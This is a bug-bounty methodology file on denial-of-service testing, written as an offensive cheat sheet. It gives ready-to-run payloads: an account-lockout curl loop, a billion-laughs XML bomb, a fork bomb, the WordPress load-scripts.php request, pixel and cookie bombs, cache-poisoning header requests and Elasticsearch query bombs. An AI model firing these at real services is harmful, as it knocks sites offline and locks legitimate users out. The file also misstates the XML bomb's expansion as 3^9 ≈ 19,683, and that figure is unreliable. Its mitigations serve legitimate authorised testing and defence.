---
name: "denial-of-service-testing"
version: "2.1"
category: "pwn"
subcategory: "dos"
phase: "exploitation"
tags: ["bug-bounty", "cache-poisoning", "denial-of-service", "dos", "injection", "pwn", "access-control", "account-takeover", "api", "auth", "authorization", "bypass", "cloud", "cors", "exploitation", "fuzzing", "graphql", "idor", "iis", "information-disclosure", "js-recon", "mass-assignment", "mobile", "oauth", "path-traversal", "privesc", "session", "takeover", "token", "waf-bypass"]
tools: ["curl", "burpsuite", "adb", "burp", "ghauri", "sqlmap", "arjun", "authz", "autorize", "graphqlmap", "grpcurl", "john", "kiterunner", "paramalyzer", "parameth", "repeater", "restler", "zap"]
follow_up_skills: ["exploitation-chaining", "bug-bounty-reporting"]
description: "Bug bounty skill: denial of service testing - exploitation phase, pwn category"
---
# Denial of Service

## Summary

DoS attacks aim to make a service unavailable by overwhelming it with a flood of requests or exploiting vulnerabilities to crash or degrade performance. DDoS uses multiple sources (botnets) simultaneously. DoS testing should be conducted cautiously — it can disrupt the target environment and result in loss of access or data exposure.

## Methodology

### Locking Customer Accounts

Repeated failed login attempts can lock a victim's account if the application temporarily or permanently bans after X bad attempts.

```bash
for i in {1..100}; do curl -X POST -d "username=user&password=wrong" <target_login_url>; done
```

This is often out-of-scope for pentests — verify scope before testing.

### File Limits on Filesystem

When a process writes files on the server, filling all available inodes causes a `No space left on device` error.

| Filesystem | Maximum Inodes |
|------------|---------------|
| BTRFS | 2^64 (~18 quintillion) |
| EXT4 | ~4 billion |
| FAT32 | ~268 million |
| NTFS | ~4.2 billion (MFT entries) |
| XFS | Dynamic (disk size) |
| ZFS | ~281 trillion |

**FAT32** has a 4 GB file size limit — often replaced by exFAT or NTFS for larger files. Modern filesystems like BTRFS, ZFS, and XFS support exabyte-scale files.

Alternative: Fill an application file (SQLite database, log file) until it reaches the filesystem's maximum file size.

### Memory Exhaustion — Technology Specific

#### XML External Entity (Billion Laughs / XML Bomb)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

Entity expansion causes exponential memory growth — the entity `&lol9;` expands to 3^9 ≈ 19,683 "lol" strings.

#### GraphQL — Deeply Nested Queries

```graphql
query {
    repository(owner:"rails", name:"rails") {
        assignableUsers (first: 100) {
            nodes {
                repositories (first: 100) {
                    nodes {

                    }
                }
            }
        }
    }
}
```

Recursive or deeply nested queries can exhaust server memory. Mitigated by query depth limiting and cost analysis.

#### Image Resizing / Pixel Flood

Send invalid images with manipulated headers — abnormal dimensions or pixel counts — to cause excessive memory allocation during resize operations.

```
https://target.com/img/vulnerable.jpg?width=500&height=500
→ change to
https://target.com/img/vulnerable.jpg?width=99999999999&height=99999999999
```

If the app allows image upload, upload an image with extremely large pixel dimensions (pixel flood). The image processor may attempt to allocate memory proportional to width × height.

#### GIF Frame Flood

Upload a GIF file with a very large number of frames. Each frame requires separate processing/memory, potentially exhausting server resources.

#### SVG Handling

SVG is XML-based — the billion laughs attack works inside SVG files as well.

#### Regular Expression DoS (ReDoS)

A crafted input triggers catastrophic backtracking in a poorly written regex, causing the CPU to spin for minutes or crash. Common vulnerable patterns include nested quantifiers like `(a+)+$` or `(\w+\s?)+$` when matched against strings like `"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX"`.

#### WordPress load-scripts.php DoS (CVE-2018-6389)

WordPress's `/wp-admin/load-scripts.php` allows unauthenticated loading of multiple JS files at once via the `load` parameter. Sending all registered script handles in a single request exhausts server CPU and memory.

```bash
curl -s "https://target.com/wp-admin/load-scripts.php?c=0&load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter"
```

Affects all WordPress versions. Mitigation: restrict `/wp-admin/` with authentication.

#### Fork Bomb

Rapidly creates new processes in a loop, consuming all system resources until the machine becomes unresponsive.

```bash
:(){ :|:& };:
```

### Cookie Bomb

Set a large value in a parameter that gets reflected into a cookie. If the server sets a cookie with the oversized value, subsequent requests include that cookie, increasing request size and potentially exceeding server limits.

```
https://target.com/index.php?param1=xxxxxxxxxxxxxx
```

If the response sets a cookie containing `param1`'s value, the cookie bomb is planted — each subsequent request carries the bloated cookie.

### Long Form Inputs

Submit extremely long values in form fields (password, email, username, address). If the server accepts oversized input without proper length limits, processing/storing the value can exhaust memory.

```
POST /register HTTP/1.1
Host: target.com
...

username=victim&password=aaaaaaaaaaaaaaa...[very long]
```

### No Rate Limit Exhaustion

If an endpoint lacks rate limiting (login, OTP, password reset, file generation), repeatedly sending requests can overwhelm the server. Extended brute-force attempts may degrade or crash the service.

### Header-Based DoS

#### HTTP Header Oversize (HHO)

Send an HTTP request with a header larger than the origin server supports but smaller than what the cache supports. The cache stores the oversized header request while the origin rejects it with `400 Bad Request`, causing a cache poisoning Denial of Service.

```
GET /index.html HTTP/1.1
Host: victim.com
X-Oversized-Header-1: [very large value]
...
```

Response: `HTTP/1.1 400 Bad Request` — Header size exceeded.

#### HTTP Meta Character (HMC)

Send a request header containing harmful meta characters (control characters like `\r`, `\n`, `\a`, `\b`). The origin may reject the request while the cache accepts and stores it, causing CPDoS.

```
GET /index.html HTTP /1.1
Host: victim.com
X-Meta-Malicious-Header: \r\n
...
```

Response: `HTTP/1.1 400 Bad Request` — Character not allowed.

#### HTTP Method Override (HMO)

Use headers like `X-HTTP-Method-Override`, `X-HTTP-Method`, or `X-Method-Override` to override the HTTP method. A GET request with `X-HTTP-Method-Override: POST` may be processed differently by origin vs cache, causing CPDoS if the origin returns an error but the cache stores a stale response.

```
GET /index.php HTTP/1.1
Host: victim.com
X-HTTP-Method-Override: POST
...
```

Response: `HTTP/1.1 404 Not Found` — POST on /index.php not found.

#### Accept-Encoding Duplication

Send `Accept-Encoding` with duplicate or multiple values:

```
Accept-Encoding: gzip, gzip, deflate, br, br
```

Some servers mishandle duplicate encoding values, leading to processing errors or crashes.

### Query Bombs (OpenSearch / Elasticsearch DoS)

Search clusters can be DoS'd by sending computationally expensive Query DSL requests that exhaust CPU, memory, disk I/O, or network resources.

#### Attack Surface

- Unauthenticated search endpoints
- Public-facing APIs proxying to OpenSearch/Elasticsearch
- Dashboards (Kibana, OpenSearch Dashboards) with unrestricted queries
- Proxy/ingestion pipelines that forward raw queries to cluster

#### Type 1 — Match All Query Bomb

```json
{
  "params": {
    "index": "*",
    "body": {
      "size": 10000,
      "query": {
        "match_all": {}
      }
    }
  }
}
```

What makes it expensive:
- `index: "*"` — searches every index in the cluster (hundreds of indices)
- `match_all` — matches every document, no filtering
- `size: 10000` — requests the maximum result window
- Every shard must participate, coordinator node merges all responses
- Increases CPU, RAM, disk reads, and network traffic

#### Type 2 — Query String Bomb

```json
{
  "query": {
    "query_string": {
      "query": "((((((((((((((((((((((((((avvvv))))))))))))))))))))))))))"
    }
  }
}
```

What makes it expensive:
- OpenSearch uses the Lucene Query Parser which interprets syntax recursively
- Deeply nested parentheses create exponential parsing steps
- Modern versions impose limits but deeply nested expressions still consume CPU

#### Common Expensive Query Patterns

1. **Match All** — `"match_all": {}` searches everything
2. **Large Size** — `"size": 10000` returns excessive results
3. **Wildcard Queries** — `"wildcard": { "field": "*admin*" }` expensive on large datasets
4. **Regex Queries** — `"regexp": { "field": ".*admin.*" }` CPU intensive
5. **Script Queries** — `"script": { ... }` executes code during search
6. **Complex Boolean Queries** — deeply nested AND/OR/NOT conditions increase query complexity

#### Resource Impact

- **CPU**: Parsing, query execution, ranking, aggregations
- **Memory**: Large result sets require memory for sorting, scoring, buffering
- **Disk I/O**: Searching every shard causes reads across the cluster
- **Network**: Large responses increase serialization, compression, transfer

#### Potential Damage

- High CPU utilization, increased memory usage
- Slow dashboards and API responses
- Delayed indexing, search timeouts
- Cluster instability, temporary Denial of Service

#### Testing Approach

1. Identify search endpoints accepting JSON query bodies
2. Test `match_all` with `index: "*"` on a small scale first (monitor response times)
3. Test nested `query_string` with deep parentheses
4. Test wildcard/regex queries on known large fields
5. Test `size: 10000` combined with resource-intensive queries
6. Monitor for increased latency, error rates, or timeout responses

#### Mitigation

- Rate limiting on search endpoints
- Query complexity analysis (max clause count, max nested depth)
- Resource limits per query (max size, max scroll context)
- Dedicated search nodes for query-heavy workloads
- Authentication/authorization on search APIs
- Circuit breakers for CPU/memory usage at node level

### X-Forwarded-Based Cache Poisoning

Send requests with manipulated `X-Forwarded-Port` or `X-Forwarded-Host` headers pointing to a non-existent port/host. If the cache uses these headers to generate the cache key, it may store a poisoned response that subsequent requests receive instead of the legitimate one.

```
GET /index.php HTTP/1.1
Host: www.hackerone.com
X-Forwarded-Port: 123
...
```

```
GET /index.php HTTP/1.1
Host: www.hackerone.com
X-Forwarded-Host: www.hackerone.com:123
...
```

If the origin generates error pages based on these headers and the cache stores them, all subsequent users receive the error response (CPDoS).

### CPDoS (Cache Poisoned Denial of Service)

CPDoS is a Web Cache Poisoning variant that causes a denial of service by making the cache store an error page instead of legitimate content.

#### Attack Flow

1. The attacker sends a request containing a malicious header with a crafted value (e.g., `x-mal-example: tohackthehacker`).
2. The intermediate cache server checks for a cached copy — not finding one, it forwards the request to the origin server.
3. The origin server rejects the request due to the malformed/malicious header and returns an error response (400, 404, 500, etc.).
4. The cache server stores this error page, treating it as the legitimate response for the requested resource.
5. All subsequent visitors receive the cached error page instead of the real content until the cache expires.

#### Variants

- **HTTP Header Oversize (HHO)** — Send a header larger than what the origin allows but smaller than the cache limit. The origin returns `400 Header Size Exceeded`, and the cache stores it.
- **HTTP Meta Character (HMC)** — Include control/meta characters (`\r`, `\n`, `\a`, `\b`) in a header value. The origin rejects them while the cache accepts and stores the error.
- **HTTP Method Override (HMO)** — Use method override headers (`X-HTTP-Method-Override`, `X-HTTP-Method`, `X-Method-Override`) to make the origin process a different method than what the cache sees, causing an error response to be cached.

#### Hop-by-Hop Headers

It is possible to perform a CPDoS attack by abusing Hop-by-Hop Headers. These headers (e.g., `Connection`, `Transfer-Encoding`, `Proxy-Authorization`) are consumed by intermediate proxies and not forwarded to the origin. Discrepancies in how caches vs. origins handle hop-by-hop headers can be leveraged for CPDoS.

## Not a Finding If

- Account lockout is a designed security control with reasonable thresholds and automatic unlock
- Filesystem limits are monitored and alert before exhaustion
- The application has DoS protections (rate limiting, WAF, CDN, query depth analysis)

## Notes

- Account lockout DoS is frequently out of scope for bug bounty programs — verify before testing
- The billion laughs attack is also covered in XXE testing (`Knowledge/Vulnerabilities/XXE.md`)
- ReDoS requires identifying a vulnerable regex pattern and a crafted input that triggers exponential backtracking
- Modern GraphQL APIs often implement `max_depth` and query cost analysis to prevent nested DoS
- CPDoS (Cache Poisoned DoS) exploits the gap between cache and origin server parsing — test with oversized headers, meta characters, and method override headers
- Cookie bombs persist on the client side — even after the session ends, the bloated cookie may be sent on every request
- Pixel/frame flood attacks rely on image processing libraries allocating memory proportional to declared dimensions — some libraries pre-allocate without validating, making them vulnerable
- ReDoS can be tested locally with tools like `regex101.com` (debug mode shows steps) — look for catastrophic backtracking in the step count

## References

- https://en.wikipedia.org/wiki/Denial-of-service_attack
- https://owasp.org/www-community/attacks/Denial_of_Service
- https://en.wikipedia.org/wiki/Billion_laughs_attack
- https://cpdos.org
- https://hackerone.com/reports/2334446
